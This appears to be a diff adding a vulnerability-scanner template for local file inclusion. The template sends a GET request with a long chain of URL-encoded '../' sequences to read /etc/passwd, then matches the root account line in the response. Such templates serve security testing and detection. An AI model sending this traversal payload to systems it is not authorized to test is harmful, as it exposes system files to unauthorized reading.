@@ -1,0 +1,28 @@
+id: LFI
+
+info:
+
+  name: Local File Inclusion
+
+  author: pikpikcu
+
+  severity: high
+
+requests:
+
+  - method: GET
+
+    path:
+
+      - '{{BaseURL}}/vjp2/vjp2-1/vjp2-2/vjp2-3/vjp2-4/vjp2-5/vjp2-6/vjp2-7/vjp2-8/vjp2-9/vjp2-10/vjp2-11/vsrc/uploads/4f55cb0581a8a3447b1afcbd54021e3e/%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2fpasswd'
+      
+    matchers:
+
+      - type: regex
+
+        regex:
+
+          - "root:[x*]:0:0:"
+          
+        part: body
+
